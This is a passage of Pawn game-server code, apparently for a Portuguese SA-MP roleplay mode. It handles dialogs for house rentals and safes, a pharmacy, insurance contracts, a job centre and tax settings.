	                if(hInfo[hID][AluguerStatus] == 0)
	                {
						SendClientMessage(playerid, COLOR_INFO, "Ativaste o aluguer da tua casa");
						hInfo[hID][AluguerStatus] = 1;
					}
	                else
	                {
	                    SendClientMessage(playerid, COLOR_INFO, "Desativaste o aluguer da tua casa");
	                    hInfo[hID][AluguerStatus] = 0;
	                }
	                GuardarCasa(hID);
	                
	                return 1;
	            }
	            case 2: // preço aluguer
	            {
	                return ShowPlayerDialog(playerid, DIALOG_CASA_ALUGUER, DIALOG_STYLE_INPUT, "{FFFF00}PREÇO ALUGUER", "{FFFFFF}Introduz o preço do aluguer.", "Escolher", "Sair");
	            }
	            case 3: // depositar
	            {
	                return ShowPlayerDialog(playerid, DIALOG_CASA_DEPOSITAR, DIALOG_STYLE_INPUT, "{FFFF00}DEPOSITAR CASA", "{FFFFFF}Introduz o montante que deseja depositar.", "Depositar", "Sair");
	            }
	            case 4: // extrair
	            {
	                return ShowPlayerDialog(playerid, DIALOG_CASA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR CASA", "{FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
	            }
	        }
		}
		case DIALOG_CASA_ALUGUER:
		{
	        if(!response) return 1;

            new hID = GetPlayerVirtualWorld(playerid);
            
	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_CASA_ALUGUER, DIALOG_STYLE_INPUT, "PREÇO DO ALUGUER", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço do aluguer.", "Escolher", "Sair");
			new aluguer = strval(inputtext);
			if(aluguer < 0) return ShowPlayerDialog(playerid, DIALOG_LOJA_ENTRADA, DIALOG_STYLE_INPUT, "PREÇO DO ALUGUER", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço do aluguer.", "Escolher", "Sair");

			hInfo[hID][Aluguer] = aluguer;
			GuardarCasa(hID);
			AtualizarCasa(hID);

			format(string, sizeof(string), "Alteraste o preço de aluguer da tua casa para %d$", aluguer);
			SendClientMessage(playerid, COLOR_INFO, string);

			return 1;
		}
		case DIALOG_CASA_DEPOSITAR:
		{
	        if(!response) return 1;

            new hID = GetPlayerVirtualWorld(playerid);

	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_CASA_DEPOSITAR, DIALOG_STYLE_INPUT, "DEPOSITAR CASA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair");
			new montante = strval(inputtext);
			if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_CASA_DEPOSITAR, DIALOG_STYLE_INPUT, "DEPOSITAR CASA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair");
			if(montante > GetPlayerMoneyEx(playerid)) return ShowPlayerDialog(playerid, DIALOG_CASA_DEPOSITAR, DIALOG_STYLE_INPUT, "DEPOSITAR CASA", "{FF0000}Não tens esse dinheiro todo. {FFFFFF}Introduz o montante que deseja depositar.", "Escolher", "Sair");

			hInfo[hID][Bank] += montante;
			GivePlayerMoneyEx(playerid, -montante);

			format(string, sizeof(string), "Depositaste %d$ na no cofre da tua casa. Total: %d$", montante, hInfo[hID][Bank]);
			SendClientMessage(playerid, COLOR_INFO, string);

			return 1;
		}
		case DIALOG_CASA_EXTRAIR:
		{
	        if(!response) return 1;

            new hID = GetPlayerVirtualWorld(playerid);
	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_CASA_EXTRAIR, DIALOG_STYLE_INPUT, "EXTRAIR CASA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
			new montante = strval(inputtext);
			if(montante <= 0) return ShowPlayerDialog(playerid, DIALOG_CASA_EXTRAIR, DIALOG_STYLE_INPUT, "EXTRAIR CASA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
			if(montante > hInfo[hID][Bank]) return ShowPlayerDialog(playerid, DIALOG_CASA_EXTRAIR, DIALOG_STYLE_INPUT, "EXTRAIR CASA", "{FF0000}Não tens esse dinheiro todo no cofre. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");

			hInfo[hID][Bank] -= montante;
			GivePlayerMoneyEx(playerid, montante);

			format(string, sizeof(string), "Extraiste %d$ do cofre da tua casa. Total: %d$", montante, hInfo[hID][Bank]);
			SendClientMessage(playerid, COLOR_INFO, string);

			return 1;
		}
		case DIALOG_FARMACIA:
		{
			if(!response) return 1;
			
			if(GetPlayerMoneyEx(playerid) < PRECO_MEDICAMENTOS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
			if(pInfo[playerid][Medicamentos] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens medicametos");
			if(pInfo[playerid][ReceitaMedica] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Precisas de uma receita médica para comprares medicamentos");
			
			new bID = GetPlayerVirtualWorld(playerid);

		    switch(listitem)
		    {
		        case 0:
				{
				    if(pInfo[playerid][Doenca] != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Gripe");
				    
				    pInfo[playerid][Medicamentos] = 1;
				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Cêgripe");
				}
				case 1:
				{
				    if(pInfo[playerid][Doenca] != 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma Infeção Urinária");
				    
				    pInfo[playerid][Medicamentos] = 2;
				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Cran-Aid");
				}
				case 2:
				{
				    if(pInfo[playerid][Doenca] != 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Dores de Barriga");
				    
				    pInfo[playerid][Medicamentos] = 3;
				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Tylenol");
				}
				case 3:
				{
				    if(pInfo[playerid][Doenca] != 4) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Tosse");
				    
				    pInfo[playerid][Medicamentos] = 4;
				    SendClientMessage(playerid, COLOR_INFO, "Compraste uma caixa de Bisolvon");
				}
		    }
		    
		    GivePlayerMoneyEx(playerid, -PRECO_MEDICAMENTOS);
		    bInfo[bID][Produtos]--;
		    bInfo[bID][Bank] += PRECO_MEDICAMENTOS;
		    
		    PlayerActionMessage(playerid, 15.0, "compra uma caixa de medicamentos e coloca-a no bolso.");
		    
		    return 1;
		}
		case DIALOG_LOJA_SEGUR:
		{
	        if(!response) return 1;

			switch(listitem)
			{
			    case 0:
			    {
					new bID = GetPlayerVirtualWorld(playerid);

					if(bInfo[bID][Type] != BTYPE_SEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
				    if(GetPlayerMoneyEx(playerid) < PRECO_CONTSEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
				    if(pInfo[playerid][Seguradora] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma seguradora. Termina o contrato com ela primeiro.");

				    pInfo[playerid][Seguradora] = bID;
				    pInfo[playerid][MensalidadeSeguradora] = bInfo[bID][Seguradora];

				    GivePlayerMoneyEx(playerid, -PRECO_CONTSEGURADORA);
				    bInfo[bID][Bank] += PRECO_CONTSEGURADORA;

				    PlayerActionMessage(playerid, 15.0, "pega na caneta e assina o contrato.");

				    format(string, sizeof(string), "Assinaste contrato com a seguradora {00FF00}%s {52E3BA}com sucesso!", bInfo[bID][Nome]);
				    SendClientMessage(playerid, COLOR_INFO, string);
			    }
			    case 1:
			    {
					new bID = GetPlayerVirtualWorld(playerid);

					if(bInfo[bID][Type] != BTYPE_SEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
				    if(pInfo[playerid][Seguradora] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma seguradora.");
				    if(pInfo[playerid][Seguradora] != bID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}O teu contrato não é com essa seguradora!");
					if(pInfo[playerid][SeguradoraCount] < 5) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de esperar 5 meses para acabares o teu contrato ((paychecks))!");

				    pInfo[playerid][Seguradora] = 0;
				    pInfo[playerid][MensalidadeSeguradora] = 0;

				    PlayerActionMessage(playerid, 15.0, "rasga o contrato, anulando-o.");

				    format(string, sizeof(string), "Acabaste o teu contrato com a seguradora {00FF00}%s {52E3BA}com sucesso!", bInfo[bID][Nome]);
				    SendClientMessage(playerid, COLOR_INFO, string);
			    }
			}

			return 1;
		}
		case DIALOG_CENTROEMPREGO:
		{
			if(!response) return 1;

			if(pInfo[playerid][Emprego] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens um emprego");

			if(pInfo[playerid][Faction] != 0)
			{
				if(fInfo[pInfo[playerid][Faction]][Legal] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás numa faction legal");
			}

		    switch(listitem)
		    {
		        case 0:
				{
	                if(jInfo[1][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[1][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[1][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[1][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}
	
				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[1][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);
					
					pInfo[playerid][Emprego] = 1;
				}
				case 1:
				{
	                if(jInfo[2][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[2][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[2][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[2][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}
					
				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[2][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 2;
				}
				case 2:
				{
	                if(jInfo[3][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[3][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[3][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[3][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}
				
				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[3][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 3;
				}
				case 3:
				{
	                if(jInfo[4][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[4][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[4][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[4][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}
				
				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[4][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 4;
				}
				case 4:
				{
	                if(jInfo[5][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[5][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[5][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[5][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}

				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[5][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 5;
				}
				case 5:
				{
	                if(jInfo[6][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[6][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[6][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[6][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}
				
				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[6][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 6;
				}
				case 6:
				{
	                if(jInfo[7][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[7][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[7][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[7][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}
				
				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[7][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 7;
				}
				case 7:
				{
	                if(jInfo[8][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[8][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[8][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[8][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}
				
				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[8][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 8;
				}
				case 8:
				{
	                if(jInfo[9][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[9][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[9][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[9][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}

				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[9][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 9;
				}
				case 9:
				{
	                if(jInfo[10][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[10][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[10][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[10][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}

				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[10][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 10;
				}
				case 10:
				{
	                if(jInfo[11][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[11][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[11][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[11][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}

				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[11][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 11;
				}
				case 11:
				{
	                if(jInfo[12][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[12][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[12][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[12][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}

				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[12][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 12;
				}
				case 12:
				{
	                if(jInfo[13][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[13][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[13][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[13][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}

				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[13][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 13;
				}
				case 13:
				{
	                if(jInfo[14][Ligeiros] == 1)
					{
					    if(pInfo[playerid][CartaLig] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Ligeiros");
					}
					else if(jInfo[14][Pesados] == 1)
					{
					    if(pInfo[playerid][CartaPesados] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Pesados");
					}
					else if(jInfo[14][Motociclos] == 1)
					{
					    if(pInfo[playerid][CartaMota] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Motociclos");
					}
					else if(jInfo[14][Barco] == 1)
					{
					    if(pInfo[playerid][CartaBarco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens carta de Barco");
					}

				    format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Agora pertences ao emprego %s", jInfo[14][Nome]);
					SendClientMessage(playerid, COLOR_CHAT, string);

					pInfo[playerid][Emprego] = 14;
				}
		    }
		    
		    pInfo[playerid][Rotas] = 0;
		    pInfo[playerid][EmpregoNivel] = 1;
		}
	    case DIALOG_IMPOSTO_MENU:
		{
			if(!response) return 1;

		    switch(listitem)
		    {
		        case 0: // imposto geral
				{
					return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_GERAL, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO GERAL", "{FFFFFF}Introduz o montante para o imposto geral.", "Escolher", "Sair");
				}
				case 1: // carros
				{
                    return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CARRO, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO AUTOMÓVEL", "{FFFFFF}Introduz o montante para o imposto automóvel.", "Escolher", "Sair");
				}
				case 2: // casas
				{
                    return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CASA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO CASAS", "{FFFFFF}Introduz o montante para o imposto sobre as casas.", "Escolher", "Sair");
				}
				case 3: // lojas
				{
                    return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_LOJA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO NEGÓCIOS", "{FFFFFF}Introduz o montante para o imposto sobre os negócios.", "Escolher", "Sair");
				}
		    }

		    return 1;
		}
		case DIALOG_IMPOSTO_GERAL:
		{
		    if(!response) return 1;
		    
		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_GERAL, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO GERAL", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto geral.", "Escolher", "Sair");
		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_GERAL, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO GERAL", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto geral.", "Escolher", "Sair");

            new montante = strval(inputtext);
            
            if(montante < 0 || montante > 500) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_GERAL, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO GERAL", "{FF0000}Valor inválido (0-500). {FFFFFF}Introduz o montante para o imposto geral.", "Escolher", "Sair");
		    
			oInfo[0][Impostos] = montante;
			GuardarOutros();

			format(string, sizeof(string), "Alteraste os impostos para %d$.", montante);
			SendClientMessage(playerid, COLOR_INFO, string);
		    
		    return 1;
		}
		case DIALOG_TT:
		{
		    AfterTutorial(playerid);
		    
		    return 1;
		}
		case DIALOG_IMPOSTO_CARRO:
		{
		    if(!response) return 1;

		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CARRO, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO AUTOMÓVEL", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto automóvel.", "Escolher", "Sair");
		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CARRO, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO AUTOMÓVEL", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto automóvel.", "Escolher", "Sair");

            new montante = strval(inputtext);

            if(montante < 0 || montante > 50) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CARRO, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO AUTOMÓVEL", "{FF0000}Valor inválido (0-50). {FFFFFF}Introduz o montante para o imposto automóvel.", "Escolher", "Sair");

			oInfo[0][ImpostoCarros] = montante;
			GuardarOutros();

			format(string, sizeof(string), "Alteraste o imposto automóvel para %d$.", montante);
			SendClientMessage(playerid, COLOR_INFO, string);

		    return 1;
		}
		case DIALOG_IMPOSTO_CASA:
		{
		    if(!response) return 1;

		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CASA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE PROPRIEDADES", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto sobre propriedades.", "Escolher", "Sair");
		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CASA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE PROPRIEDADES", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto sobre propriedades.", "Escolher", "Sair");

            new montante = strval(inputtext);

            if(montante < 0 || montante > 100) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_CASA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE PROPRIEDADES", "{FF0000}Valor inválido(0-100). {FFFFFF}Introduz o montante para o imposto sobre propriedades.", "Escolher", "Sair");

			oInfo[0][ImpostoCasas] = montante;
			GuardarOutros();

			format(string, sizeof(string), "Alteraste o imposto sobre propriedades para %d$.", montante);
			SendClientMessage(playerid, COLOR_INFO, string);

		    return 1;
		}
		case DIALOG_IMPOSTO_LOJA:
		{
		    if(!response) return 1;

		    if(strlen(inputtext) == 0) return ShowPlayerDialog(playerid, DIALOG_IMPOSTO_LOJA, DIALOG_STYLE_INPUT, "{FFFF00}IMPOSTO SOBRE NEGÓCIOS", "{FF0000}Valor inválido. {FFFFFF}Introduz o montante para o imposto sobre negócios.", "Escolher", "Sair");
